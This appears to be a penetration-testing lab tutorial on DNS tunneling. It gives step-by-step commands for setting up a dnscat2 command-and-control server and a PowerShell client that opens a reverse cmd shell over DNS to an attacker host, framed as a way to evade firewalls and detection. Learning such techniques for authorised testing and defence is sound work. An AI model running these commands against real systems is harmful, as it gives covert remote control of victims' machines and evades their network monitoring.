

## What is DNS Tunneling?

DNS tunneling lets you **send data secretly using DNS** queries.

âœ… Why it's useful for attackers:

- Firewalls usually allow DNS (UDP port 53).
- You can send commands and receive responses using only DNS.
- Itâ€™s stealthy and avoids detection.

## Tool: `dnscat2`

Dnscat2 is a **C2 (Command & Control)** tool that:
- Sends data inside **DNS TXT records**
- Encrypts communication using a **pre-shared secret**
- Supports both a **Ruby-based server** and **PowerShell-based client**

## Setup: Attacker Machine (dnscat2 server)
```bash
# 1. Clone the server
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/

# 2. Install Ruby dependencies
sudo gem install bundler
sudo bundle install

# 3. Run the server
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

## Setup: Windows Target (dnscat2 client)

```powershell
# On attacker machine:
git clone https://github.com/lukebaggett/dnscat2-powershell.git

# Then, on the **target** (PowerShell):
Import-Module .\dnscat2.ps1

Start-Dnscat2 -DNSserver 10.10.14.18 `
              -Domain inlanefreight.local `
              -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 `
              -Exec cmd
```
This will:
- Connect to your server via DNS
- Start a reverse **CMD shell**

## Back on Your Attacker Machine
Youâ€™ll see:
```bash
Session 1 Security: ENCRYPTED AND VERIFIED!
```

Now, interact with the shell:
```bash
dnscat2> window -i 1
```

ðŸŽ‰ You can now type commands directly into the shell:

```bash
C:\Windows\system32> whoami
```
